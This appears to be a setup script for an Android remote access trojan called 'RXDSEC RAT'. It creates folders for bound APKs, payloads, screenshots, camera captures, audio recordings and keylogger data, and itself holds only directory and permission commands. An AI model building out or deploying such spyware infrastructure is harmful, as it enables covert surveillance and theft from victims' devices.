#!/bin/bash

# Create essential directories for RXDSEC RAT
echo "Creating essential directories for RXDSEC RAT..."

# Create data directory structure
mkdir -p data/uploads
mkdir -p data/payloads
mkdir -p data/bound_apks
mkdir -p data/screenshots
mkdir -p data/camera_captures
mkdir -p data/audio_recordings
mkdir -p data/keylog_data
mkdir -p data/file_transfers

# Create logs directory
mkdir -p logs

# Set appropriate permissions
chmod -R 755 data
chmod -R 755 logs

echo "Directory structure created successfully!"
echo ""
echo "Created directories:"
echo "- data/uploads (For APK uploads)"
echo "- data/payloads (For RAT payloads)"
echo "- data/bound_apks (For generated bound APKs)"
echo "- data/screenshots (For device screenshots)"
echo "- data/camera_captures (For camera images)"
echo "- data/audio_recordings (For microphone recordings)"
echo "- data/keylog_data (For keylogger data)"
echo "- data/file_transfers (For file transfer operations)"
echo "- logs (For server logs)"
echo ""
echo "All set up and ready to go!"